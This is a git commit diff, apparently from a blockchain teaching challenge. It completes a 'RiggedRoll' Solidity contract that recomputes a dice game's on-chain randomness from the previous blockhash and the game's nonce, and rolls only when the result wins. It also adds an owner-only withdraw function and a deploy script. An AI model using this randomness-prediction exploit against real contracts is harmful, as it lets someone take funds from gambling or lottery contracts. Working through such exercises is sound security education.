41db500c2ba1c5989c0f7d2d9467b84d0de71124
Lucas Seijo <lucaseijo7@gmail.com>
2023-04-20 23:42:34 -0300

    challenge finished

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -1,4 +1,4 @@
-pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
+pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
 //SPDX-License-Identifier: MIT
 
 import "hardhat/console.sol";
@@ -6,6 +6,7 @@ import "./DiceGame.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
+    uint256 minimumBalance = .002 ether;
 
     DiceGame public diceGame;
 
@@ -14,11 +15,24 @@ contract RiggedRoll is Ownable {
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
-
+    function withdraw(address _addr, uint256 _amount) public onlyOwner {
+        (bool sent, ) = _addr.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
+    function riggedRoll() public {
+        require(address(this).balance >= minimumBalance, "Not enough ETH");
+        bytes32 prevHash = blockhash(block.number - 1);
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
+        );
+        uint256 roll = uint256(hash) % 16;
 
+        require(roll <= 2, "Outcome is not winner !");
+        diceGame.rollTheDice{value: minimumBalance}();
+    }
 
     //Add receive() function so contract can receive Eth
-    
+    receive() external payable {}
 }
--- packages/hardhat/deploy/01_deploy_riggedRoll.js
+++ packages/hardhat/deploy/01_deploy_riggedRoll.js
@@ -9,19 +9,17 @@ module.exports = async ({ getNamedAccounts, deployments, getChainId }) => {
 
   const diceGame = await ethers.getContract("DiceGame", deployer);
 
-  /*
   await deploy("RiggedRoll", {
-   from: deployer,
-   args: [diceGame.address],
-   log: true,
+    from: deployer,
+    args: [diceGame.address],
+    log: true,
   });
-  */
 
-  //const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
+  const riggedRoll = await ethers.getContract("RiggedRoll", deployer);
 
-  //const ownershipTransaction = await riggedRoll.transferOwnership("** YOUR FRONTEND ADDRESS **");
-  
-
+  const ownershipTransaction = await riggedRoll.transferOwnership(
+    "0x04FAf55B9ed829F4c42ea3241761fde7A4F43630"
+  );
 };
 
 function sleep(ms) {
